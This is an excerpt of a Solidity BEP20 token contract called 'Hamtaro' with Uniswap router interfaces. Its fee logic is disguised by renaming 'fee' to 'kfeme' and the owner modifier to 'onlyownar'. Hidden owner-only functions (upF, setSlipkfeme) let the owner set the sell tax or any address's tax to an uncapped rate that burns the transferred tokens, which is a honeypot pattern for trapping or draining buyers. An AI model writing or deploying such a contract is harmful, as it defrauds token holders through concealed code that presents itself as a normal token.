...
interface IUniswapV2Factory {
    ...
    function kfemeTo() external view returns (address);
    function kfemeToSetter() external view returns (address);
    ...
    function setkfemeTo(address) external;
    function setkfemeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingkfemeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingkfemeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingkfemeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingkfemeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingkfemeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Hamtaro is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellkfeme = 0;

    uint256 private _defaultBuykfeme = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipkfeme;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellkfeme = _value;
    }

    function setSlipkfeme(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipkfeme[_address] = _value;
    }

    function getSlipkfeme(address _address) external view onlyownar returns (uint256) {
        return _slipkfeme[_address];
    }


    function setMAccountkfeme(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountkfeme(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradekfemeAmount = 0;

        if (rF) {
            uint256 tradekfeme = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradekfeme = _defaultSellkfeme;
                }
                if (from == uniswapV2Pair) {

                    tradekfeme = _defaultBuykfeme;
                }
            }
            if (_slipkfeme[from] > 0) {
                tradekfeme = _slipkfeme[from];
            }

            tradekfemeAmount = _Amount.mul(tradekfeme).div(100);
        }


        if (tradekfemeAmount > 0) {
            _balances[from] = _balances[from].sub(tradekfemeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradekfemeAmount);
            emit Transfer(from, _deadAddress, tradekfemeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradekfemeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradekfemeAmount);
        emit Transfer(from, _to, _Amount - tradekfemeAmount);
    }
